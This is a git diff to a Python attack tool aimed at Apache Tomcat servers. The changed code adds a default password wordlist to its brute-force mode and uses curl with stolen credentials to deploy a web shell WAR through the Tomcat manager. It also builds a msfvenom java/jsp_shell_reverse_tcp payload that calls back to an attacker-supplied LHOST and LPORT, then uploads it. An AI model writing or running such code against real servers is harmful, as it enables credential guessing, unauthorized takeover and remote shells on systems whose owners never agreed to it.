@@ -1,4 +1,5 @@
 import argparse
+import glob
 import os.path
 import random
 import shutil
@@ -62,20 +63,6 @@ def banner() -> str:
 
 '''
 
-
-# progress_bar object - serve as a model
-'''
-Putting in comment as its not use anymore (maybe need it later)
-progress_bar = Progress(
-    "{task.description}",
-    TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
-    BarColumn(),
-    MofNCompleteColumn(),
-    TextColumn("•"),
-    TimeElapsedColumn(),
-    TextColumn("•"),
-    TimeRemainingColumn(),
-)'''
 
 # common username list of tomcat's most common username - serve as backup if no user list
 common_username: list[str] = [
@@ -204,7 +191,7 @@ class authenticated_attack(tomcat):
                 response = requests.get(url=f"{self.url}/web_shell/index.jsp")
 
                 if response.status_code != 200:
-                    command = f"curl --upload-file webshell/web_shell.war -u '{self.username}:{self.password}' '{self.url}/manager/text/deploy?path=/web_shell'"
+                    command = f"curl --upload-file resources/web_shell.war -u '{self.username}:{self.password}' '{self.url}/manager/text/deploy?path=/web_shell'"
                     subprocess.run(command, shell=True, check=True)
 
                 response = self.execute_webshell_cmd(cmd="whoami")
@@ -242,9 +229,9 @@ class authenticated_attack(tomcat):
 
                     subprocess.run(
                         ["msfvenom", "-p", "java/jsp_shell_reverse_tcp", f"LHOST={args.lhost}", f"LPORT={args.lport}",
-                         "-f", "war", "-o", f"{filename}.war"], check=True, capture_output=True)
+                         "-f", "war", "-o", f"resources/{filename}.war"], check=True, capture_output=True)
 
-                    command = f"curl --upload-file {filename}.war -u '{self.username}:{self.password}' '{self.url}manager/text/deploy?path=/{filename}'"
+                    command = f"curl --upload-file {filename}.war -u '{self.username}:{self.password}' '{self.url}/manager/text/deploy?path=/reverse'"
                     subprocess.run(command, shell=True, check=True, capture_output=True)
                     output.message(state="success", description="Uploading revershell", clear_before=False)
 
@@ -337,6 +324,8 @@ def main():
         output.message("error", f"{binary_curl} is not installed", False)
         return
 
+    args.url = args.url.rstrip("/")
+
     if args.user and args.password:
         core.utils.version_detection(url=args.url, username=args.user, password=args.password)
 
@@ -345,10 +334,13 @@ def main():
     match args.mode:
         # settings for brute mode
         case 'brute':
-            if not all([args.url, args.wordlist]):
-                parser.error(" url and -w arguments are requires for this mode.")
+            if not args.url:
+                parser.error("Url argument are require for this mode.")
             else:
                 output.message("success", "Mode Brute selected", False)
+
+                if not args.wordlist:
+                    args.wordlist = 'resources/password-list-common-tomcat.txt'
 
                 tomcat_instance = unauthenticated_attack(url=args.url, wordlist=args.wordlist, userlist=args.userlist)
                 credentials_found = tomcat_instance.brute_force()
